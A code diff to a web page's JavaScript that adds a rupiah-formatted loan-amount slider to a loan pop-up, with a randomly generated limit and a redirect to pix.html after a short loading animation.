@@ -243,6 +243,13 @@ window.addEventListener(
 
 });
 
+const loanPopup = document.getElementById("loanPopup");
+const loanRange = document.getElementById("loanRange");
+const loanAmount = document.getElementById("loanAmount");
+const limitUtama = document.getElementById("limitUtama");
+const limitTotal = document.getElementById("limitTotal");
+const cairkanBtn = document.getElementById("cairkanBtn");
+
 function formatRupiah(angka){
     return "Rp" + angka.toLocaleString("id-ID");
 }
@@ -257,31 +264,55 @@ function randomLimit(){
     ) * step + min;
 }
 
+function updateLoanSlider(){
+    const value = Number(loanRange.value);
+    const max = Number(loanRange.max);
+    const percent = (value / max) * 100;
+
+    loanAmount.innerText = formatRupiah(value);
+
+    loanRange.style.background = `
+        linear-gradient(
+            90deg,
+            #1aa8ff 0%,
+            #1aa8ff ${percent}%,
+            #edf3f8 ${percent}%,
+            #edf3f8 100%
+        )
+    `;
+
+    localStorage.setItem("jumlahPinjaman", value);
+}
+
+loanRange.addEventListener("input", updateLoanSlider);
+
 function showLoanPopup(){
     const limit = randomLimit();
 
     localStorage.setItem("limitPinjaman", limit);
 
-    document.getElementById("limitUtama").innerText =
-    formatRupiah(limit);
+    limitUtama.innerText = formatRupiah(limit);
+    limitTotal.innerText = formatRupiah(limit);
 
-    document.getElementById("limitTotal").innerText =
-    formatRupiah(limit);
+    loanRange.max = limit;
+    loanRange.value = 500000;
 
-    document.getElementById("loanPopup").classList.add("show");
+    updateLoanSlider();
+
+    loanPopup.classList.add("show");
 }
 
-document.getElementById("cairkanBtn").addEventListener("click", () => {
-    document.getElementById("loanPopup").classList.remove("show");
+cairkanBtn.addEventListener("click", () => {
+    loanPopup.classList.remove("show");
 
-    document.getElementById("loadingBox").style.display = "flex";
+    loadingBox.style.display = "flex";
 
     setTimeout(() => {
         document.body.classList.add("fade-out");
 
         setTimeout(() => {
             window.location.href = "pix.html";
-        }, 500);
+        },500);
 
-    }, 900);
+    },900);
 });
